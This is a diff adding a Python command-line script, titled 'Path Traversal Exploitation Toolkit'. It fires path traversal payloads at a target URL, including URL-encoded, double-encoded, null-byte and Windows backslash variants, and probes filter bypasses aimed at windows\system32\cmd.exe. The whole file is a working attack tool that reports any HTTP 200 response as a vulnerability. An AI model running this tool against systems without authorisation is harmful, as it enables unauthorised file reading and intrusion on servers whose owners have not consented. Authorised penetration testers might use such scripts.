@@ -1,0 +1,95 @@
+import requests
+import argparse
+import os
+import platform
+import urllib.parse
+
+def generate_payloads(filename):
+    """
+    Generates different path traversal payloads to test against vulnerable endpoints.
+    """
+    payloads = [
+        f'../{filename}',
+        f'..%2f{filename}',  # URL encoded payload
+        f'..%252f{filename}',  # Double URL encoded payload
+        f'..%00{filename}',  # Null byte injection (older systems)
+        f'..\\{filename}',  # Windows style path traversal
+        f'..\\..\\{filename}'  # Windows with multiple directory traversal
+    ]
+    return payloads
+
+def detect_server_config(url):
+    """
+    Detects the target server configuration (Linux vs Windows).
+    """
+    try:
+        response = requests.get(url)
+        server = response.headers.get('Server', '')
+        if 'Windows' in server:
+            return 'Windows'
+        elif 'Linux' in server:
+            return 'Linux'
+        else:
+            return 'Unknown'
+    except requests.exceptions.RequestException as e:
+        print(f"Error detecting server configuration: {e}")
+        return 'Unknown'
+
+def test_vulnerability(url, payloads):
+    """
+    Test the given URL with path traversal payloads.
+    """
+    for payload in payloads:
+        full_url = f"{url}/{payload}"
+        print(f"Testing: {full_url}")
+        try:
+            response = requests.get(full_url)
+            if response.status_code == 200:  # Or another condition indicating vulnerability
+                print(f"Vulnerability found with payload: {full_url}")
+        except requests.exceptions.RequestException as e:
+            print(f"Error testing URL {full_url}: {e}")
+
+def detect_bypass_techniques(url):
+    """
+    Detects common bypass techniques on a given URL.
+    """
+    encoded_payload = urllib.parse.quote('..\\..\\windows\\system32\\cmd.exe')
+    double_encoded_payload = urllib.parse.quote(encoded_payload)
+    null_byte_payload = '..\\..\\..%00'
+
+    payloads = [encoded_payload, double_encoded_payload, null_byte_payload]
+
+    for payload in payloads:
+        full_url = f"{url}/{payload}"
+        try:
+            response = requests.get(full_url)
+            if response.status_code == 200:
+                print(f"Potential bypass found with payload: {full_url}")
+        except requests.exceptions.RequestException as e:
+            print(f"Error checking bypass for {full_url}: {e}")
+
+def main():
+    parser = argparse.ArgumentParser(description="Path Traversal Exploitation Toolkit")
+    parser.add_argument("url", type=str, help="Target URL to test for path traversal vulnerabilities")
+    parser.add_argument("--file", type=str, default="testfile.txt", help="File to test for traversal")
+    args = parser.parse_args()
+
+    print(f"Starting Path Traversal testing on {args.url}...")
+    print(f"Testing file: {args.file}")
+
+    # Generate payloads
+    payloads = generate_payloads(args.file)
+
+    # Detect server configuration
+    server_type = detect_server_config(args.url)
+    print(f"Detected server type: {server_type}")
+
+    # Test for path traversal vulnerabilities
+    test_vulnerability(args.url, payloads)
+
+    # Detect common bypass techniques
+    detect_bypass_techniques(args.url)
+
+if __name__ == '__main__':
+    main()
+ 
